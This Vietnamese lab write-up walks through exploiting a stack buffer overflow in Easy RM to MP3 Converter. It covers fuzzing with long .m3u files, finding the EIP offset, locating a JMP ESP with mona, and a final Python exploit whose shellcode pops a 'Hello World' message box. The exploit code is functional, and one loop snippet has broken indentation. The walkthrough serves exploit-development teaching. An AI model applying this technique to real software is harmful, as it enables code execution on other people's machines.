# babe kajima 

## Mô hình 

- Sử dụng CentOS7 cài đặt python 
- Sử dụng win7 32 bit cài đặt python 2.7.14

## Tải phần mềm Easy RM to MP3 Converter

Bước 1: 

- Tải phần mềm cài đặt tại <a href="https://samsclass.info/127/proj/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">đây</a>.

- Sau khi cài đặt xong 


    <img src="https://i.imgur.com/i3F63B2.png">

- Trên máy CentOS sử dụng chương trình python tạo ra 10000 kí tự A 

    ```
    vim gen_payload.py
    ```
    ```
    #!/usr/bin/python
    attack = 'A' * 10000
    print attack
    ````

    Ghi vào một file đuôi m3u

    ```
    python gen_payload.py > demo.m3u
    ```

    Sử dụng python run webserver 

    ```
    python -m SimpleHTTPServer 8888
    ```

- Trên máy win7 truy cập vào http://IP_centos:8888 tải file demo.m3u

    <img src="https://i.imgur.com/2sFEiyO.png">

- Chạy demo.m3u trên ứng dụng convert 

    Chọn Load sau đó tới đường dẫn thư mục chứa demo.m3u đã tải về 

    <img src="https://i.imgur.com/cpguxpo.png">

Bước 2: 

- Làm tương tự bước 1 tăng lên 20000 kí tự 
- Đến 30000 kí tự ứng dụng bị crash 

    <img src="https://i.imgur.com/OQcdziQ.png">

Bước 3: 

- Tạo ra một chuỗi payload để xác định độ dài buffer 

    ```
    #!/usr/bin/python

    prefix = 'A' * 20000
    chars = ''
    for a in range(0x41, 0x5A):
    for i in range(0x30, 0x3A):
        for j in range(0x30, 0x3A):
            chars += chr(a) + chr(a) + chr(i) + chr(j)
    attack = prefix + chars
    print attack
    ```

    ```
    python gen_payload.py > payload.m3u
    ```

    payload gồm 20000 kí tự A và 25000 một nhóm gồm 4 kí tự có dạng như sau 

    ```
    A...
    A...
    A...
    AA00 AA01 AA02 ... AA98 AA99 
    BB00 BB01 BB02 ... BB98 BB99 
                ...
    PP00 ...  PP22 PP23 ... PP99 
                ...
    YY00 YY01 YY02 ... YY98 YY99
    ```


Bước 4: 

- Mở Immunity Debugger click File => Open 

    <img src="https://i.imgur.com/QQIRM2Q.png">

- F9 để run ứng dụng 
- Load file chứa payload

    <img src="https://i.imgur.com/ZGf8pRw.png">

- Giá trị EIP đang là 50313250 

```
50 P
31 1
32 2
50 P
```
Intel processors are "Little Endian", so addresses are inserted in reverse order => EIP là 'P21P'

- P21P năm ở hàng số  16 cột số  21 => 15*400 + 21*4 +1

=> buffer có độ dài 6085


Bước 6: exploit 

- Tìm một module có ASLR=False và Rebase=False

    ```
    !mona modules
    ```

    <img src="https://i.imgur.com/ZIQDQUX.png">

- Tìm địa chỉ lệnh jump ESP

    Việc ghi đè EIP bằng địa chỉ của ESP khiến chúng ta có thể chạy shellcode ở địa chỉ ô nhớ tiếp sau đó.

    jump esp là một kỹ thuật phổ biến trên thực tế, các ứng dụng Windows sử dụng một hoặc nhiều dll, và các dll này chứa rất nhiều code instructions. Hơn nữa các địa chỉ được sử dụng bởi các dll này khá tĩnh. Vì vậy mình có thể tìm thấy một dll có chứa lệnh để chuyển sang đặc biệt và có thể ghi đè EIP bằng địa chỉ của lệnh đó trong dll mà chúng ta tìm thấy.

    ```
    !mona jmp -r esp -m MSRMfilter03.dll
    ```

    <img src="https://i.imgur.com/jUYGKDQ.png">

    ```
    #!/usr/bin/python

    prefix = 'A' * (20000 + 15*400 + 21*4 + 1)
    eip = '\x58\xb0\x01\x10'
    skip4 = 'FFFF'
    nopsled = '\x90' * 16
    shellcode = (
    "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b" +
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09" +
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d" +
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03" +
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81" +
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04" +
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03" +
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3" +
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68" + 
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68" +
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9" +
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65" +
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01" +
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68" +
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68" +
    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68" +
    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57" +
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c" +
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78" +
    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0"
    )
    int3 = '\xCC'
    padding = 'F' * (30000 - len(prefix) - 4 -4 -16 - 1 - len(shellcode))
    attack = prefix + eip + skip4 + nopsled + shellcode + int3 + padding
    print attack
    ```

Bước 7: 

<img src="https://i.imgur.com/xUTdzLO.gif">
